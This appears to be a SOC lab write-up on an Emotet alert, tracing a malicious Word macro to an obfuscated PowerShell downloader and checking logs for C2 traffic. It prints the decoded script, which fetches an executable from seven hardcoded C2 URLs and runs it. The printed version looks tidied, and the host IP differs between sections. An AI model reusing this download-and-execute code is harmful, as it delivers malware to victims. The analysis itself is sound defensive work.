# SOC109 â€” Emotet Malware Detected

## Executive Summary

On March 22, 2021, the Security Operations Center (SOC) investigated a SIEM alert indicating that a user attempted to download a malicious file, **1word.doc**, on the host at IP address **172.16.17.58**. The file's hash (**349d13ca99ab03869548d75b99e5a1d0**) was identified by multiple threat intelligence platforms as the Emotet trojan, a malware known for spreading via phishing. Dynamic analysis revealed a multi-stage attack where a malicious macro in the Word document executes an obfuscated PowerShell script designed to download a secondary payload from a list of command-and-control (C2) servers. A review of the network logs confirmed that no C2 communication occurred from the affected host. The alert is a **True Positive**, but the attack was **unsuccessful** as the antivirus software contained the threat upon detection.

## Incident Details

The initial alert was received from the SIEM dashboard:

<img width="1278" height="434" alt="image" src="https://github.com/user-attachments/assets/04b0b129-a18c-432a-8dc0-6e3f32c01f96" />

| | |
| :--- | :--- |
| **Date of Incident** | March 22, 2021 |
| **Source Host** | 172.16.17.45 |
| **File Name** | 1word.doc |
| **File Hash (MD5)** | 349d13ca99ab03869548d75b99e5a1d0 |
| **Malware Family** | Emotet |

## Investigation and Analysis

### 1. Initial Triage & Threat Intelligence

The investigation began by analyzing the provided file hash on VirusTotal. The results showed a high detection rate, with numerous vendors identifying it as malicious, often specifically as a document containing a malicious macro.
<img width="1361" height="723" alt="image" src="https://github.com/user-attachments/assets/0f89ecbb-511a-46dd-987b-a6756f70a596" />


### 2. Dynamic Analysis (Sandbox)

To safely determine the file's behavior, the hash was analyzed in AnyRun. The sandbox report confirmed the file's malicious nature and detailed its execution chain.
<img width="1705" height="816" alt="image" src="https://github.com/user-attachments/assets/5d76a0d4-caa5-42dd-8528-7a9d1f32545d" />


The analysis showed that upon opening the document, `WINWORD.EXE` spawns a `powershell.exe` process. The parent `WINWORD.EXE` process was noted for using WMI scripts, a technique often used to launch processes stealthily without a visible window to evade user detection.

<img width="637" height="263" alt="image" src="https://github.com/user-attachments/assets/3f0ed4bb-5dc7-49c2-94d4-93e00a695508" />


### 3. Payload Deobfuscation

The child `powershell.exe` process contained a heavily obfuscated script.

<img width="647" height="388" alt="image" src="https://github.com/user-attachments/assets/e7f31db5-ed98-4ea5-b0be-ed703163e804" />


The obfuscated code was identified as a Base64 encoded string:
```
JABNADYAaABxADkAcAA1AD0AKAAoACcAUQAnACsAJwB0AHgAJwApACsAKAAnAGQAegBzACcAKwAnAG
gAJwApACkAOwAuACgAJwBuAGUAdwAnACsAJwAtAGkAdABlACcAKwAnAG0AJwApACAAJABlAE4AVgA6
... (truncated for brevity)
==
```

Using CyberChef, the script was deobfuscated to reveal its true purpose.
<img width="1377" height="780" alt="image" src="https://github.com/user-attachments/assets/5219d7a5-a57e-4b23-abaf-24cb61e1f446" />


The final, readable PowerShell script is as follows:
```powershell
# Define variables
$directoryName = "qtxdzsh";
$exeName = "e2937a4y.exe";
$downloadPath = "$env:USERPROFILE\sqpgdfi\qkgpwc\$exeName";

# Create directory
New-Item -Path "$env:USERPROFILE\sqpgdfi\qkgpwc" -ItemType Directory -Force;

# Set security protocol
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;

# Define URL list
$urls = @(
    "http://fortcollinssathletefactory.com/wp-admin/i/",
    "http://getming.com/forum/p/",
    "http://gaffa-music.com/cgi-bin/UM/",
    "http://frankfurtelfarolillo.com/laseu/c7/",
    "http://evilnerd.org/cgi-bin/nUi/",
    "http://gapesmm.org/old/M/",
    "http://grml.net/wp/C/"
);

# Create WebClient
$webClient = New-Object Net.WebClient;

# Download and execute file
foreach ($url in $urls) {
    try {
        $webClient.DownloadFile($url, $downloadPath);
        if ((Get-Item $downloadPath).Length -ge 32254) {
            Invoke-Item $downloadPath;
            break;
        }
    } catch {}
}
```
This script's primary function is to create a directory, then attempt to download and execute a secondary payload (`e2937a4y.exe`) from a list of hardcoded C2 URLs.

### 4. Network Analysis

The AnyRun sandbox report confirmed that the malware attempted to contact the URLs listed in the decoded script.

<img width="971" height="73" alt="image" src="https://github.com/user-attachments/assets/6c548b29-22cb-4308-a327-95877bfa68f7" />


The domains and their corresponding IPs were flagged as malicious:
*   `grml.net` -> `85.214.109.143`
*   `getming.com` -> `156.239.86.188`

A review of the log management platform was conducted to see if the compromised host (`172.16.17.58`) made any outbound connections to these malicious indicators.

<img width="1324" height="514" alt="image" src="https://github.com/user-attachments/assets/5da06782-29eb-40e1-896d-18e559df233a" />


The logs confirm that **no C2 servers were contacted**. This indicates that the antivirus solution on the endpoint successfully detected and contained the malware before it could establish a network connection and download its next stage.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, VirusTotal, AnyRun (Sandbox), CyberChef
*   **Skills Demonstrated:** Threat Intelligence Analysis, Sandboxing, Malware Analysis, PowerShell Deobfuscation, Log Analysis.

## Playbook Solution: Incident Classification

*   **Is the File Malicious?** **Yes.** It is a confirmed Emotet downloader.
*   **What Is the Attack Type?** **Trojan / Malware Delivery.**
*   **Was the Attack Successful?** **No.** The antivirus software successfully detected and contained the malware, preventing infection and C2 communication.
*   **Do You Need Tier 2 Escalation?** **No.** The threat was successfully neutralized by an automated defense (antivirus). No further incident response is required.
*   **Incident Classification:** **True Positive.** The alert correctly identified a legitimate threat, even though the attack was ultimately unsuccessful.

## Conclusion and Recommendations

The alert for SOC109 was a **true positive** for an attempted infection by the Emotet malware. The attack vector was a malicious Word document that used macros to execute a PowerShell downloader script. The investigation confirms that while the initial file was downloaded, the organization's endpoint security controls worked as intended, preventing the malware from executing its C2 communication and downloading its secondary payload. The device was not compromised.

**Recommendations:**

1.  **Acknowledge Prevention:** Note the successful prevention by the antivirus solution.
2.  **Block Indicators:** Proactively add the file hash (`349d13ca99ab03869548d75b99e5a1d0`) and the list of C2 domains/IPs to the organization's blocklists (firewall, web proxy, DNS sinkhole) to enhance network defenses.
3.  **User Awareness:** Consider this event as an opportunity to reinforce user awareness training regarding phishing emails and the dangers of enabling macros in documents from untrusted sources.
